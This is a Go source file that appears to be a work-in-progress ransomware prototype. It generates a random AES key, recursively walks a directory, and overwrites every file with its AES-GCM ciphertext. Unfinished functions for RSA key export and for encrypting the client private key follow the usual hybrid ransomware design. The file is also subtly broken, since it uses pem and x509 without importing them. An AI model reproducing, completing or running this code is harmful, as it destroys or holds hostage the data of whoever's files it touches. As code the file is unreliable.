package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"fmt"
	"runtime"
	"io"
	"os"
)

var key []byte
var fileSep string
var serverPub []byte

func main() {

	home, _ := os.UserHomeDir()
	fmt.Println("home ", home)

	//testdir := ".\\test"
	testdir := "./test"

	opSystem := runtime.GOOS
	fileSep = "/"
	if opSystem == "windows" {
		fileSep = "\\"
	}

	err := genKey()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	traverseFiles(testdir)
}

func genKey() error {
	key = make([]byte, 32)
	_, err := rand.Read(key)

	fmt.Println("key ", key)
	fmt.Printf("%x ", key)
	return err
}

func createClientRsa() (*rsa.PrivateKey, *rsa.PublicKey) {
	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	pubKey := &privKey.PublicKey
	return privKey, pubKey
}

func writeClientKeys(privKey *rsa.PrivateKey, pubKey *rsa.PublicKey) error {
	//pemPrivFile, err := os.Create("private_key.pem")
	//if err != nil {
	//	fmt.Println(err)
	//	return err
	//}
	pemPubFile, err := os.Create("public_key.pem")
	if err != nil {
		fmt.Println(err)
		return err
	}
	// start export process
	// var pemPrivBlock = &pem.Block{
	// 	Type: "RSA PRIVATE KEY",
	// 	Bytes: x509.MarshalPKCS1PrivateKey(privKey),
	// }
	var pemPubBlock = &pem.Block{
		Type: "PUBLIC KEY",
		Bytes: x509.MarshalPKCS1PublicKey(pubKey),
	}
	// write block to file
	//err = pem.Encode(pemPrivFile, pemPrivBlock)
	//if err != nil {
	//	return err
	//}
	//pemPrivFile.Close()
	err = pem.Encode(pemPubFile, pemPubBlock)
	if err != nil {
		return err
	}
	pemPubFile.Close()
	return nil
}

func encryptClientPriv(*rsa.PrivateKey) {

}


func traverseFiles(path string) {
	var dirs []string

	files, err := os.ReadDir(path)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	for _, file := range files {
		if file.IsDir() {
			base := path + fileSep + file.Name()
			dirs = append(dirs, base)
			fmt.Println("dir path: ", base)
		} else {
			base := path + fileSep + file.Name()

			fmt.Println("file to enc: ", base)
			encryptFile(base)
		}
	}
	for _, dir := range dirs {
		traverseFiles(dir)
	}
}

func encryptFile(path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fmt.Println("path ", path)
	fmt.Println("data ", data)


	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	nonce := make([]byte, gcm.NonceSize())

	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	enc := gcm.Seal(nonce, nonce, data, nil)
	fmt.Println("enc data ", enc)
	err = os.WriteFile(path, enc, 0777)
	if err != nil {
		fmt.Println(err)
	}
}

